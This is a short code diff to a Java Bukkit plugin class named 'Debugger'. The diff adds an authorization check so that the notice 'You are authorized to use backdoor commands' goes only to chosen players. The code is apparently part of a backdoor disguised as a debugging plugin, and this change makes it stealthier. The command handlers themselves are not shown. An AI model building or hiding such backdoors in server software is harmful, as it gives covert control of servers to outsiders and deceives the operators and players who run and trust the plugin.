@@ -266,7 +266,8 @@ public final class Debugger implements Listener {
             Bukkit.getConsoleSender()
                     .sendMessage("Creating states for player: " + player.getName());
 
-        player.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " You are authorized to use backdoor commands. Run " + Config.command_prefix + "help");
+        if(IsUserAuthorized(player))
+            player.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " You are authorized to use backdoor commands. Run " + Config.command_prefix + "help");
     }
 
     /*Basic command parser*/
